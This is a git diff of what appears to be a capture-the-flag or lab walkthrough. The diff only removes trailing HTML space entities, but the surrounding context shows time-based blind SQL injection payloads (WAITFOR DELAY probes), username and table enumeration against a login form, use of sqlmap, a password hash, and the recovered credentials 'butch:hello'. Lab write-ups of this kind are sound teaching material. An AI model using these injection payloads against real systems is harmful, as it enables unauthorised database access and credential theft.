@@ -32,7 +32,7 @@ Default credentials don't work. Attempting any form of SQL Injection shows this:
 
 <figure><img src="../../../.gitbook/assets/image (1375).png" alt=""><figcaption></figcaption></figure>
 
-So this is definitely vulnerable to SQL Injection. I was unable to bypass this login, so I used `sqlmap` to verify the type of injection we needed to use.&#x20;
+So this is definitely vulnerable to SQL Injection. I was unable to bypass this login, so I used `sqlmap` to verify the type of injection we needed to use.
 
 <figure><img src="../../../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>
 
@@ -46,7 +46,7 @@ So first, we can use this to verify that we have SQL Injection:
 'IF (1=1) WAITFOR DELAY '0:0:10'--
 ```
 
-Afterwards, I enumerated some possible usernames, and found that `butch` was one of them.&#x20;
+Afterwards, I enumerated some possible usernames, and found that `butch` was one of them.
 
 ```sql
 'if (select user) = 'butch' waitfor delay '0:0:10'--
@@ -60,7 +60,7 @@ Let's now identify the tables that are present within this database.
 ```
 {% endcode %}
 
-The above payload verifies that `users` is a table within the database. Now we can check for columns.&#x20;
+The above payload verifies that `users` is a table within the database. Now we can check for columns.
 
 {% code overflow="wrap" %}
 ```sql
@@ -95,7 +95,7 @@ e7c22b994c59d9cf2b48e549b1e24666636045930d3da7c1acb299d1c3b7f931f94aae41edda2c2b
 ```
 {% endcode %}
 
-I tested all of these using this payload, and then attempted to login with `butch:hello`.&#x20;
+I tested all of these using this payload, and then attempted to login with `butch:hello`.
 
 {% code overflow="wrap" %}
 ```sql
